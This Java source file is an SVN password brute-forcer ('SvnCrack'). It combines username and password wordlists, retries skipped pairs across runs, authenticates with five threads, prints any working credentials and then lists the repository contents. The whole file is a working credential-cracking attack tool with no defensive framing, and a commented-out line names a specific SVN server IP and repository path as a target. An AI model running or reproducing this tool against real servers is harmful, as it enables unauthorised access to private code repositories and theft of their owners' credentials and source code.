import Utils.DictUtils;
import Utils.UserPassPair;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.concurrent.atomic.AtomicLong;
import org.apache.commons.cli.*;

import static Utils.DictUtils.*;
import static Utils.PrintLog.*;
import static Utils.SvnUtils.*;
import static Utils.UserPassPair.replaceUserMarkInPass;

public class SvnCrack {
    public static void main(String[] args){
        //输出版本信息
        String version = "0.1 20241112";
        print_info(String.format("Current Tools Version is: %s", version));

        // 设置 SVN 仓库的 URL 和路径
        String SVNLoginUrl = null;
        String SVNCheckPath= null;
        //String SVNLoginUrl = "svn://47.56.88.224:1688";
        //String SVNCheckPath = "/data/svn/reon"; // 你要列出的目录路径 包错的时候会提示实际目录
        //读取账号密码文件
        String userDictPath= null;
        String passDictPath= null;
        //String userDict = "C:\\Users\\WINDOWS\\GithubProject\\CrackCaptchaLogin_Plus\\target\\CrackCaptcahLogin-3.8\\dict\\username-5000.txt";
        //String passDict = "C:\\Users\\WINDOWS\\GithubProject\\CrackCaptchaLogin_Plus\\target\\CrackCaptcahLogin-3.8\\dict\\password-5.txt";

        // 添加选项并设置默认值
        Options options = new Options();
        try {
            Option SVNLoginUrlOption = new Option("t", "target", true, "SVN login URL");
            SVNLoginUrlOption.setRequired(true);
            SVNLoginUrlOption.setArgName("SVNLoginUrl");
            options.addOption(SVNLoginUrlOption);

            Option SVNRepoOption = new Option("r", "repo", true, "SVN repo path to check, not must need.");
            SVNRepoOption.setRequired(false);
            SVNRepoOption.setArgName("SVNCheckPath");
            options.addOption(SVNRepoOption);

            Option userDictOption = new Option("U", "user-dict", true, "User dict file path");
            userDictOption.setRequired(false);
            userDictOption.setArgName("UserDict");
            options.addOption(userDictOption);

            Option passDictOption = new Option("P", "pass-dict", true, "Password dict file path");
            passDictOption.setRequired(false);
            passDictOption.setArgName("PassDict");
            options.addOption(passDictOption);

            CommandLineParser parser = new DefaultParser();
            CommandLine cmd = parser.parse(options, args);
            SVNLoginUrl = cmd.getOptionValue("t");
            SVNCheckPath = cmd.getOptionValue("r", "/");
            userDictPath = cmd.getOptionValue("U", "user.txt");
            passDictPath = cmd.getOptionValue("P", "pass.txt");
        } catch (ParseException e) {
            print_error(String.format("SvnCrack CMD Parse Error:%s\n%s", options, e.getMessage()));
            System.exit(1);
        }

        if (SVNLoginUrl==null||SVNCheckPath==null||userDictPath==null||passDictPath==null) return;
        List<String> userList = DictUtils.readDictFile(userDictPath);
        List<String> passList = DictUtils.readDictFile(passDictPath);

        String globalCrackHistoryFilePath = SVNLoginUrl.replace(":","_").replace("/","_") + ".history.log";
        String globalCrackLogRecodeFilePath = SVNLoginUrl.replace(":","_").replace("/","_")+ ".result.csv";
        String globalPairSeparator = ":";

        if (userList.isEmpty()||passList.isEmpty()){
            System.out.println(String.format("[!] Please Check!!! Read User Or Pass Dict Was Empty: USER:%s PASS:%s", userList.size(), passList.size() ));
            return;
        }

        //加载加载账号字典
        List<UserPassPair> userPassPairList =  createCartesianUserPassPairs(userList, passList);

        //替换密码中的用户名变量
        String userMarkInPass = "%USER%";
        userPassPairList = replaceUserMarkInPass(userPassPairList, userMarkInPass);
        print_debug(String.format("Pairs Count After Replace Mark Str [%s]", userPassPairList.size()));

        //读取 history 文件,排除历史扫描记录 ，
        userPassPairList = excludeHistoryPairs(userPassPairList, globalCrackHistoryFilePath, globalPairSeparator);
        print_debug(String.format("Pairs Count After Exclude History [%s] From [%s]", userPassPairList.size(), globalCrackHistoryFilePath));

        //判断字典列表数量是否大于0
        if(userPassPairList.size() > 0){
            print_info(String.format("Read User Pass Dict End Current User:Pass Number[%s], Start SVN Crack...", userPassPairList.size()));
        } else {
            print_error(String.format("Read User Pass Dict End Current User:Pass Number[%s], Skip SVN Crack!!!", userPassPairList.size()));
            return;
        }

        //开始进行爆破
        try {
            //初始化SVN客户端
            initSvnSetup();

            // 创建线程池
            //int numberOfThreads = Runtime.getRuntime().availableProcessors();
            int numberOfThreads = 5;
            ExecutorService executorService = Executors.newFixedThreadPool(numberOfThreads);

            // 共享的标志变量
            final AtomicBoolean authenticationSuccessful = new AtomicBoolean(false);
            final AtomicInteger totalTasks = new AtomicInteger(userPassPairList.size());
            final AtomicInteger completedTasks = new AtomicInteger(0);
            final AtomicLong totalTime = new AtomicLong(0);

            //进行日志记录
            String title = "SVN_URL,USERNAME,PASSWORD,STATUS";
            writeTitleToFile(globalCrackLogRecodeFilePath, title);

            // 进行爆破操作
            for (int index = 0; index < userPassPairList.size(); index++) {
                final int currentIndex = index;
                final UserPassPair userPassPair = userPassPairList.get(currentIndex);
                final List<UserPassPair> finalUserPassPairList = userPassPairList;
                final String finalSVNLoginUrl = SVNLoginUrl;
                final String finalSVNCheckPath = SVNCheckPath;

                executorService.submit(() -> {
                    // 如果已经成功认证，不再执行后续任务
                    if (authenticationSuccessful.get()) {
                        if (!executorService.isShutdown()) executorService.shutdown();
                        return;
                    }

                    // 记录任务开始时间
                    long taskStartTime = System.currentTimeMillis();

                    // 检查认证信息
                    String svnUser = userPassPair.getUsername();
                    String svnPass = userPassPair.getPassword();

                    if (checkAuthentication(finalSVNLoginUrl, svnUser, svnPass)) {
                        System.out.println(String.format("[+] %s/%s Authentication success: %s:%s", currentIndex + 1, finalUserPassPairList.size(), svnUser, svnPass));
                        authenticationSuccessful.set(true); // 设置成功标志
                        SVNRepositoryShow(finalSVNLoginUrl, finalSVNCheckPath, svnUser, svnPass);
                    } else {
                        //System.err.println(String.format("[-] %s/%s Authentication failed: %s:%s", currentIndex + 1, finalUserPassPairList.size(), svnUser, svnPass));
                    }

                    //记录爆破历史
                    writeUserPassPairToFile(globalCrackHistoryFilePath, globalPairSeparator, userPassPair);

                    //记录完整的爆破状态
                    String content = String.format("\"%s\",\"%s\",\"%s\",\"%s\"", finalSVNLoginUrl, svnUser, svnPass, authenticationSuccessful.get());
                    writeLineToFile(globalCrackLogRecodeFilePath, content);


                    if (currentIndex % 10 == 0) {
                        // 记录任务结束时间
                        long taskElapsedTime = System.currentTimeMillis() - taskStartTime;
                        // 更新总时间和已完成任务数
                        totalTime.addAndGet(taskElapsedTime);
                        completedTasks.incrementAndGet();
                        // 计算平均时间和剩余时间
                        long averageTime = totalTime.get() / completedTasks.get();
                        long remainingTasks = totalTasks.get() - completedTasks.get();
                        long estimatedRemainingTime = averageTime * remainingTasks / 1000 / 60;
                        // 输出剩余时间
                        System.out.println(String.format("[*] %s/%s Estimated remaining time:%dMIN|%dHOUR",
                                currentIndex + 1,
                                finalUserPassPairList.size(),
                                estimatedRemainingTime,
                                estimatedRemainingTime/60
                        ));
                    }

                    // 如果已经成功认证，不再执行后续任务
                    if (authenticationSuccessful.get()) {
                        if (!executorService.isShutdown()) executorService.shutdown();
                        return;
                    }
                });
            }

            // 等待所有任务完成
            executorService.shutdown();
            executorService.awaitTermination(Long.MAX_VALUE, TimeUnit.NANOSECONDS);

            // 检查是否成功认证
            if (!authenticationSuccessful.get()) {
                System.out.println("[-] GG! The password pairs of all accounts are not authenticated...");
            }

        } catch (InterruptedException e) {
            System.err.println(String.format("Error Occurred: %s", e.getMessage()));
            e.printStackTrace();
        }
    }
}